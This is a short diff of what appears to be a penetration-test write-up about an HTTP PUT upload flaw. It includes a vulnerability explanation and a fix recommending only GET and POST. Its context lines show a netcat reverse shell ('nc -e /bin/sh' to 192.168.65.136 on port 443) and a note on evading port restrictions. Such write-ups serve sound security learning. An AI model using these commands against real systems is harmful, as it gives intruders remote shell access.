@@ -53,14 +53,14 @@ Attacker side: nc -nlvp 443
 Victim side: nc -e /bin/sh 192.168.65.136 443
 ```
 </br>
-I used port 443 because the machine had port restriction, port 443 is commonly used for web traffic, so i tried it out and it worked. \
+I used port 443 because the machine had port restriction, port 443 is commonly used for web traffic, so i tried it out and it worked.
 </br>
 
 **Vulnerability Explanation:** The HTTP PUT method is normally used to upload data that is saved on the server
 at a user-supplied URL. If enabled, an attacker may be able to place arbitrary, and potentially
 malicious, content into the application. </br>
 Put method is usually disallowed, because it might lead to unrestricted file
-upload and an attacker could upload a reverse shell.
+upload and an attacker could upload a reverse shell. </br>
 **Vulnerability Fix:** Enable only HTTP methods on your web server which are necessary for your
 application to run. Use only GET and POST methods for all HTTP requests where
 possible. </br>
